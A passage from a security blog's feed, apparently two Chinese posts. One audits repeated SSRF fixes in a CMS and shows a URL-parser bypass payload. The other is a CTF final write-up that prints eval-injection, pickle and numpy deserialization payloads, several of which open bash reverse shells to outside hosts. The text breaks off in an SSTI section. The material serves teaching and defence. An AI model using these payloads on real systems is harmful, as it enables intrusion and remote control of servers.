title="CVE-2018-14858 漏洞修复"></a>CVE-2018-14858 漏洞修复</h3><p>显然只允许http与https开头的url访问,ssrf依然存在,于是在icms7.0.11版本,又有人提交了ssrf漏洞,并获得了一个cve编号.漏洞分析与上一个漏洞一直,因此省略.</p><p>提交者除了提交漏洞,还简单说明了几种常见的ssrf绕过手法,比如不同格式的ip地址.</p><p>这是作者在<a href="https://github.com/idreamsoft/iCMS/issues/33">issue33</a>下的回复.</p><blockquote><p> I know this question, but if the IP format is banned, the website using the IP format will not be collected. Although it is not used a lot, it will still be encountered. There is no better way to think about it now. </p></blockquote><p>可以看到作者对ssrf的理解有些偏差,导致修复完全没有起到作用.</p><p>过了几天,作者似乎认识到了这样并不算修复了ssrf漏洞,commit了一下过滤代码.</p><p>具体更新内容在commit中: <a href="https://github.com/idreamsoft/iCMS/commit/62de04e57a67f2690dbf88b7d381af61a0969ef3">https://github.com/idreamsoft/iCMS/commit/62de04e57a67f2690dbf88b7d381af61a0969ef3</a> </p><p>添加了过滤代码,关键代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remote</span>(<span class="params"><span class="variable">$url</span>, <span class="variable">$_count</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!iHttp::is_url(<span class="variable">$url</span>,<span class="literal">true</span>))&#123;</span><br><span class="line">        <span class="variable">$parsed</span> = parse_url(<span class="variable">$url</span>);<span class="comment">//解析url</span></span><br><span class="line">        <span class="variable">$validate_ip</span> = <span class="literal">true</span>;</span><br><span class="line">        preg_match(<span class="string">&#x27;/\d+/&#x27;</span>, <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]) &amp;&amp; <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] = long2ip(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);<span class="comment">//获取host部分,如果是十进制或其他进制的ip地址,转化成标准的ip地址</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\d+\.\d+\.\d+\.\d+/&#x27;</span>, <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$validate_ip</span> = filter_var(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>], FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);<span class="comment">//匹配正确的ip格式,过滤非法ip地址字符与内外地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$parsed</span>[<span class="string">&#x27;scheme&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;https&#x27;</span>)) || !<span class="variable">$validate_ip</span>|| strtolower(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>])==<span class="string">&#x27;localhost&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (spider::<span class="variable">$dataTest</span> || spider::<span class="variable">$ruleTest</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$url&#125;</span> 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接&lt;/b&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$url&#125;</span> 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或私有IP地址&lt;/b&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        ...</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,这次添加了检查ip地址的格式,以及是否是内网ip.</p><p>以普通开发者的角度思考,很多情况都是哪里出了问题就修哪里,什么东西能绕过就过滤什么.也很难要求他们完全了解安全漏洞,因此也导致了修复再次被绕过.</p><h3 id="CVE-2018-15895"><a href="#CVE-2018-15895" class="headerlink" title="CVE-2018-15895"></a>CVE-2018-15895</h3><p>与上个漏洞提交者是同一个人. <a href="https://github.com/idreamsoft/iCMS/issues/40">https://github.com/idreamsoft/iCMS/issues/40</a> </p><p>看似万无一失,更强的黑名单过滤,也确实不能通过绕过正则与<code>filter_var</code> 再次进行ssrf攻击.</p><p>但ssrf的常用绕过手法还有302重定向与dns重绑定.漏洞提交者也演示了这两种方式.具体poc可以看issue内容.</p><p>我们来看看作者的修复, <a href="https://github.com/idreamsoft/iCMS/commit/59ad0f303bf900f552f737b63c6fa8d92c1403d7">https://github.com/idreamsoft/iCMS/commit/59ad0f303bf900f552f737b63c6fa8d92c1403d7</a> ,关键代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_url</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$parsed</span> = parse_url(<span class="variable">$url</span>);</span><br><span class="line">    <span class="variable">$validate_ip</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>] &amp;&amp; is_array(<span class="built_in">self</span>::<span class="variable">$safe_port</span>) &amp;&amp; !in_array(<span class="variable">$parsed</span>[<span class="string">&#x27;port&#x27;</span>],<span class="built_in">self</span>::<span class="variable">$safe_port</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (spider::<span class="variable">$dataTest</span> || spider::<span class="variable">$ruleTest</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;请求错误:非正常端口,因安全问题只允许抓取80,443端口的链接,如有特殊需求请自行修改程序&lt;/b&gt;&quot;</span>.PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        preg_match(<span class="string">&#x27;/^\d+$/&#x27;</span>, <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]) &amp;&amp; <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>] = long2ip(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">        <span class="variable">$long</span> = ip2long(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$long</span>===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$safe_url</span>)&#123;</span><br><span class="line">                @putenv(<span class="string">&#x27;RES_OPTIONS=retrans:1 retry:1 timeout:1 attempts:1&#x27;</span>);</span><br><span class="line">                <span class="variable">$ip</span>   = gethostbyname(<span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br><span class="line">                <span class="variable">$long</span> = ip2long(<span class="variable">$ip</span>);</span><br><span class="line">                <span class="variable">$long</span>===<span class="literal">false</span> &amp;&amp; <span class="variable">$ip</span> = <span class="literal">null</span>;</span><br><span class="line">                @putenv(<span class="string">&#x27;RES_OPTIONS&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$parsed</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ip</span> &amp;&amp; <span class="variable">$validate_ip</span> = filter_var(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$parsed</span>[<span class="string">&#x27;scheme&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;https&#x27;</span>)) || !<span class="variable">$validate_ip</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (spider::<span class="variable">$dataTest</span> || spider::<span class="variable">$ruleTest</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;b&gt;<span class="subst">&#123;$url&#125;</span> 请求错误:非正常URL格式,因安全问题只允许抓取 http:// 或 https:// 开头的链接或公有IP地址&lt;/b&gt;&quot;</span>.PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到,使用了第17行使用了<code>gethostbyname</code> 确定parse_url解析后的host部分,来防护dns rebinding 攻击.</p><p>并且在curl的options中,注释了<code>// CURLOPT_FOLLOWLOCATION =&gt; 1,// 使用自动跳转</code>,来防护302重定向绕过.</p><p>那么如果想再次绕过,经常打ctf的小伙伴可能就会注意到了,攻击的思路可以针对parse_url的解析问题上.历代parse_url有不少方式可以绕过scheme,host,port,path等.而这些细节,是开发者很难注意到的.</p><h3 id="新的绕过"><a href="#新的绕过" class="headerlink" title="新的绕过"></a>新的绕过</h3><p>光黑名单和检查host真实ip来说,基本上是万无一失.但是作者万万没想到,来自php自身的背后一刀.在开头提到的<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf"> A New Era of SSRF </a>中,有一个新的攻击方式,利用php中的parse_url函数和libcurl对url的解析差异,导致了对host的过滤失效,进行ssrf.</p><p>从orange师傅的pdf中偷一张图来解释.</p><p><img src="image-20191116004557748.png" alt="image-20191116004557748"></p><p>php-curl拓展解析的url host在第二个@之后,而parse_url则是最后一个@之后.</p><p>因此我们可以使用如下payload绕过:</p><p><code>http://ip/admincp.php?app=spider_project&amp;do=test&amp;url=http://root:root@127.0.0.1:81@baidu.com/info.php&amp;rid=2&amp;pid=1&amp;title=</code></p><p><img src="image-20191116003035777.png" alt="image-20191116003035777"></p><p>可以看到,同时绕过了端口和host的限制,访问到了只对本地开放的81端口的phpinfo内容.成功绕过过滤实现ssrf,<del>并且水个cve编号</del></p><p>这里有一个小坑,在较新版本的curl中,已经修复了多个@的解析问题,使用多个@会报错.</p><p><img src="image-20191116005331010.png" alt="image-20191116005331010"></p><p>但是大多数linux发行版并没有使用最新版本的curl.可以在 <a href="https://curl.haxx.se/download.html">https://curl.haxx.se/download.html</a>  这里查询linux发行版与curl版本的对应关系.</p><p>我只测试了ubuntu,在ubuntu16.04以下均可以使用该方式绕过.而在ubuntu18.04中,已经不再可以.<code>exec_curl</code>函数执行会直接返回false.</p><p>ubuntu16.04的curl版本是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># curl -V</span><br><span class="line">curl 7.47.0 (x86_64-pc-linux-gnu) libcurl&#x2F;7.47.0 GnuTLS&#x2F;3.4.10 zlib&#x2F;1.2.8 libidn&#x2F;1.32 librtmp&#x2F;2.3</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp </span><br><span class="line">Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP UnixSockets </span><br></pre></td></tr></table></figure><p>已经提交了<a href="https://github.com/idreamsoft/iCMS/issues/88">issue</a>,坐等作者的修复,期待是否还有被绕过的可能:D</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>一个开发人员很难有精力去了解一个攻击方式的方方面面,也很难让开发者紧跟攻击手法的趋势.在刚才的例子看到,虽然开发者积极的解决漏洞,但是并不能有效缓解漏洞,总有普通开发者不知道的方式再次绕过.我个人认为,解决这个问题的方法只有让专业的安全专业人员去协助修复.</p><p>另外,这个漏洞在利用要进入后台,又过滤了各种敏感协议,实际上危害并不大,仅仅用来学习ssrf的绕过与防护.</p><p><em>第一次写代码审计相关文章,难免有疏漏,如有错误,还望指正</em></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;(本文首发于先知社区,链接:&lt;a href=&quot;https://xz.aliyun.com/t/7256&quot;&gt;https://xz.aliyun.com/t/7256&lt;/a&gt;)&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近开始实战代码审计,去github上找了几个100+ stars 的项目练手.&lt;/p&gt;
&lt;p&gt;看到有个cms中有个SSRF漏洞点多次被绕过,修复再被绕过.打开commit记录浏览,测试了一番,发现还能再次绕过.&lt;/p&gt;
&lt;p&gt;绕过技巧并不新颖,2017年blackhat上orange师傅演讲的:&lt;a href=&quot;https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf&quot;&gt; A New Era of SSRF &lt;/a&gt;中提出的.&lt;/p&gt;</summary>
    
    
    
    <category term="网络安全" scheme="https://m09ic.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="代码审计" scheme="https://m09ic.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Ogeek Final Writeup</title>
    <link href="https://m09ic.top/posts/56679/"/>
    <id>https://m09ic.top/posts/56679/</id>
    <published>2019-10-24T05:59:41.000Z</published>
    <updated>2021-01-04T14:52:36.829Z</updated>
    
    <content type="html"><![CDATA[<p>(本文首发于先知社区,链接:<a href="https://xz.aliyun.com/t/6530">https://xz.aliyun.com/t/6530</a>)</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靠着大腿混进决赛.膜ex师傅,膜impakho师傅.</p><p>主办方的权限控制,题目难度之类的都做得非常好.只可惜我太菜了,根本找不到洞,只会划水摸鱼.</p><p>赛制也对我这样的菜鸡非常友好.攻击和防守都可以得分,按结果来看,防守也是大多数队伍的主要得分方式.</p><p>也就是说,只要写一个可以过check的通防waf,就可以拿分.</p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>题目是一个java web,tomcat框架,不太熟悉</p><p>随手翻了下目录,一眼就看到shiro1.2.4 , 反序列化漏洞.</p><p>还以为是白给,跟着网上步骤复现了一遍,失败了.仔细看了源码,发现出题人重写了cookie的加密函数.</p><p>暂时放弃,直到有队成功攻击了我们一次,才着手防守.</p><p>防守并不困难,修改硬编码的rememberkey ,后续再也没有被攻击.</p><p>跟着飘零师傅学习下,<a href="https://www.4hou.com/web/20619.html">2019 OGeek Final &amp; Java Web</a></p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>是zero-cms,有代码备注时间在2009年,但是网上并没有找到相关信息.</p><p>php的常规思路用d盾扫一下,高难度的比赛一般不会出这么明显的后门,无功而返.</p><p>备份网站,在入口文件上了waf,/tmp目录没权限写,导致第一时间日志没上.最后一个小时才发现只有web目录下的/update可以写文件,才把日志整上. 这个时间大佬们都开始打假流量混淆了,很难从日志中审出什么东西.</p><p>看个日志还是很欢乐的,看到smile师傅的马被好几个队拿来打混淆.smile师傅的马都出名了.</p><p>一个洞都没挖到,事后看wp有几个漏洞藏的也不是很深,缺乏经验与细心.</p><p>具体漏洞情况参照xmsec师傅的博客文章<a href="https://www.xmsec.cc/ogeek-ozero-wp/">ogeek-ozero-wp</a></p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>python的flask框架,比起php和java的几十上百个文件,python的代码就友好的多了.</p><p>主要逻辑都在<code>app.py</code>里面,python的漏洞也比较明显,web3是大多数队伍的主要攻击目标.</p><h3 id="robots后门"><a href="#robots后门" class="headerlink" title="robots后门"></a>robots后门</h3><p>见面就是一个简陋的后门,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/robots.txt&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">texts</span>():</span></span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read(), as_attachment=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>把flag放在robots.txt里,访问就可以拿到.</p><h3 id="eval后门"><a href="#eval后门" class="headerlink" title="eval后门"></a>eval后门</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_str</span>(<span class="params"><span class="built_in">type</span>,<span class="built_in">str</span></span>):</span></span><br><span class="line">    retstr = <span class="string">&quot;%s&#x27;%s&#x27;&quot;</span>%(<span class="built_in">type</span>,<span class="built_in">str</span>)</span><br><span class="line">    print(retstr)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">eval</span>(retstr)</span><br></pre></td></tr></table></figure><p>定义了一个很奇怪的函数,一看就知道是刻意设置的后门,全局搜索哪里调用.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">type</span> = request.form[<span class="string">&#x27;type&#x27;</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">&#x27;msg&#x27;</span>]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(msg)&gt;<span class="number">27</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>, msg=<span class="string">&#x27;留言太长了！&#x27;</span>, status=<span class="string">&#x27;留言失败&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        retstr = set_str(<span class="built_in">type</span>,msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,msg=retstr,status=<span class="string">&#x27;%s,留言成功&#x27;</span>%username)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到message中有调用,且有简单限制,msg长度得小于27个字符且不能有空格和下划线,type只能输入一个字符</p><p>读flag的poc比较简单,payload如下:</p><p>post:  <code>type=&#39;&amp;msg=%2bopen(&#39;/flag&#39;).read()%2b&#39;</code></p><p>赛后花了不少时间思考能不能getshell,折腾半天终于成功,正好27个字符.</p><p>post:  <code>msg=%2Bos.popen(&quot;echo%09-n%09b&gt;&gt;a&quot;)%2B&#39;&amp;type=&#39;</code></p><p>简单分析payload,</p><p>首先需要通过python解释器,因此不能有语法错误,需要前后单引号以及+号闭合.</p><p>原本的app.py中已经导入os,帮了个大忙,可以使用os.popen()执行命令</p><p>不能有空格,但在bash中<code>tab</code>与空格等价url编码为<code>%09</code></p><p>echo不输出换行符可使用参数-n.</p><p>请求后会报错,但实际上已写入文件.</p><p><img src="1.png" alt="1"></p><p><img src="2.png" alt="2"></p><p>依次写入反弹shell的payload:<code>bash -c &#39;bash -i &gt;/dev/tcp/1.1.1.1/4444 0&gt;&amp;1&#39;</code>,空格用tab代替.</p><p>最后post请求<code>msg=%2Bos.popen(&quot;sh%09a&quot;)%2B&#39;&amp;type=&#39;</code>即可执行代码反弹shell.</p><p><img src="1570702314420.png" alt="1570702314420"></p><h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>看到import了pickle这个库,第一反应就是python反序列化.</p><p>全局搜索pickle.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">type</span> = request.form[<span class="string">&#x27;type&#x27;</span>][:<span class="number">1</span>]</span><br><span class="line">        msg = request.form[<span class="string">&#x27;msg&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            info = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">            info = pickle.loads(info)</span><br><span class="line">            username = info[<span class="string">&quot;name&quot;</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message.html&#x27;</span>,msg=retstr,status=<span class="string">&#x27;%s,留言成功&#x27;</span>%username)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>大致逻辑是,如果是post请求,则获取cookie中的user字段,base64解码,并触发反序列化.</p><p>反弹shell的payload,需要base64编码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cposix</span><br><span class="line">system</span><br><span class="line">p1</span><br><span class="line">(S&quot;bash -c &#39;bash -i &gt;&#x2F;dev&#x2F;tcp&#x2F;1.1.1.1&#x2F;4444 0&gt;&amp;1&#39;&quot;</span><br><span class="line">p2</span><br><span class="line">tp3</span><br><span class="line">Rp4</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>如果要直接返回flag,得使返回值的类型为字典,且有name键.</p><h3 id="numpy反序列化-CVE-2019-6446"><a href="#numpy反序列化-CVE-2019-6446" class="headerlink" title="numpy反序列化(CVE-2019-6446)"></a>numpy反序列化(CVE-2019-6446)</h3><p>队里大佬找出来的,我都不知道numpy啥时候出了漏洞,.</p><p>这个洞非常坑,虽然找到了漏洞,也非常容易修复,但一改就被checkdown.</p><p>最后尝试使用replace替换黑名单关键字,但还是被人疯狂拿分.也可能是没发现的其他漏洞.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/getvdot&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getvdot</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;getvdot.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        matrix1 = base64.b64decode(request.form[<span class="string">&#x27;matrix1&#x27;</span>])</span><br><span class="line">        matrix2 = base64.b64decode(request.form[<span class="string">&#x27;matrix2&#x27;</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            matrix1 = numpy.loads(matrix1)</span><br><span class="line">            matrix2 = numpy.loads(matrix2)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">        result = numpy.vdot(matrix1,matrix2)</span><br><span class="line">        print(result)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;getvdot.html&#x27;</span>,msg=result,status=<span class="string">&#x27;向量点积&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为numpy的loads方法调用的也是pickle,因此pickle的payload还是可以用.</p><p>payload: post提交:</p><p><code>matrix1=Y3Bvc2l4CnN5c3RlbQpwMQooUyJiYXNoIC1jICdiYXNoIC1pID4vZGV2L3RjcC8xOTIuMTY4LjU4LjEvNDQ0NCAwPiYxJyIKcDIKdHAzClJwNAou&amp;matrix2=MQ==</code></p><h3 id="Jinja2-from-string-SSTI"><a href="#Jinja2-from-string-SSTI" class="headerlink" title="Jinja2.from_string SSTI"></a>Jinja2.from_string SSTI</h3><p>也是今年新洞</p><p><a href="https://www.exploit-db.com/exploits/46386">https://www.exploit-db.com/exploits/46386</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    username = request.cookies.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    username = <span class="built_in">str</span>(base64.b64decode(username), encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    data = Jinja2.from_string(<span class="string">&quot;Hello , &quot;</span> + username + <span class="string">&#x27;!&#x27;</span>).render()</span><br><span class="line">    is_value = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;hello.html&#x27;</span>, msg=data,is_value=is_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>data处使用了 Jinja2.from_string直接拼接字符串,存在ssti.</p><p>poc 需要base64编码填入在cookie的username字段,还因为是python3 一些payload不能使用.</p><p>读flag:</p><figure class="highlight plain"><table><tr><td 